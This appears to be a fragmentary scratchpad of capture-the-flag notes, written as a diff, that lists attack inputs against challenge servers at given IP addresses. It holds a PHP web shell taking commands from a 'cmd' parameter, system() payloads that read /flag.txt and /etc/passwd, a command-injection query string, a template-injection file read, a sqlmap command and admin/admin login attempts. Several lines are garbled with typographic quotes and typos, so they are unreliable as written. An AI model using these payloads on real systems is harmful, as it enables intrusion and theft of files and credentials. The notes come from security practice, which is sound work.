@@ -1,0 +1,32 @@
+elastic python3 elastic.py http://34.159.127.208:31270/ /etc/passwd
+34.159.127.208
+
+php - <?php system(‘cat /flag.txt’)?>
+
+nodiff $ wget http://34.107.45.207:30148//backup.zip 
+ls
+$ grep –r “shell_exec(“
+34.107.45.207
+
+http://34.107.45.207:30148/?welldone=knockknock&shazam=cat flag.php
+34.107.45.207
+
+shark Curl –I http
+<%
+x=open("flag" , "r") 
+%>
+${x.readlines()}
+
+Schematics
+product_name=%25&sumbit=Search
+sqlmap --cookie=="" -u http index.php  --forms --columns --random-agent
+
+auth
+{“username”:”admin”,
+“password”:”admin”}
+token
+s-t-s 
+
+
+<?php echo system($_GET['cmd']);?>
+Php?cmd=cat%20/flag.txt
